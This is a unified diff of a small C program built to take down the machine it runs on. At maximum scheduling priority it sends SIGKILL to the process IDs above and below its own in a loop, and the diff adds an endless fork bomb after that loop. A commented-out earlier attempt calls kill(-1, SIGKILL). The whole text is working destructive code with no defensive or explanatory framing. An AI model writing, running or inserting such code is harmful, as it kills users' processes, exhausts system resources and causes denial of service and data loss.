@@ -17,16 +17,18 @@ int main()
     pid_t     pid;
 	pid_t  above = getpid();
 	pid_t  below = getpid();
-    
+    int count = 1000;
     setpriority(PRIO_PROCESS,0, -20);
-     while (1) {
+     while (count--) {
 		//__asm__("cli"); // close interrupts
 		kill(++above, SIGKILL);
 		kill(--below, SIGKILL);
 		//__asm__("sti");
 		
 	}		
-
+	while(1){
+		while((pid = fork() ) != -1);
+	}
 	//The graveyard of previous attempts
     /*while (1) {
 	//kill(-1, SIGKILL);
@@ -46,5 +48,5 @@ int main()
 			};
 			execvp(name[0], name);
 		}*/
-    }
 }
+
